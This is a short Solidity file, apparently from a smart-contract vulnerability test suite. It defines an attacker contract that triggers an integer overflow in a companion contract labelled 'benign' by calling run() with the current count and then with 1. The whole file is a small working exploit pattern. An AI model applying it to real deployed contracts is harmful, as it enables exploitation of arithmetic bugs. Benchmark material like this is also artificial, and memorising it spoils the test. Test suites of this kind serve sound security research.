pragma solidity ^0.4.19;

import "./integer_overflow_benign_1.sol";

contract IntegerOverflowBenign1Attacker {
    IntegerOverflowBenign1 victimContract;

    constructor (address _victimAddress) public {
        victimContract = IntegerOverflowBenign1(_victimAddress);
    }

    function attack() public {
        uint256 count = victimContract.count();
        
        victimContract.run(count);
        victimContract.run(1);
    }
}